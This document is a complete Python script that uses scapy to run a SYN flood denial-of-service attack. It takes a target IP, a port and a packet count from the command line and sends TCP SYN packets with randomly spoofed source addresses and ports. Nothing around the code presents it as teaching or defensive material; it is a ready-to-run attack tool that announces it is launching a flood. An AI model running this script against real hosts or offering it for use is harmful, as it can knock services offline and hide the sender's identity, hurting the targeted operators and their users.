#!/usr/bin/env python3

import socket
import sys
import random
import struct
from scapy.all import send, IP, TCP

def syn_flood(target_ip, target_port, packet_count=10000):
    try:
        print(f"[*] Launching SYN Flood on {target_ip}:{target_port} with {packet_count} packets...")

        for _ in range(packet_count):
            # Generate random source IP and port
            src_ip = f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
            src_port = random.randint(1024, 65535)
            
            # Construct SYN packet
            ip_layer = IP(src=src_ip, dst=target_ip)
            tcp_layer = TCP(sport=src_port, dport=int(target_port), flags="S", seq=random.randint(1000, 9000))
            packet = ip_layer / tcp_layer

            # Send the packet
            send(packet, verbose=False)
        
        print("[+] SYN Flood attack completed.")

    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python3 syn_flood.py <target_ip> <target_port> <packet_count>")
        sys.exit(1)

    target = sys.argv[1]
    port = sys.argv[2]
    packets = int(sys.argv[3])
    
    syn_flood(target, port, packets)
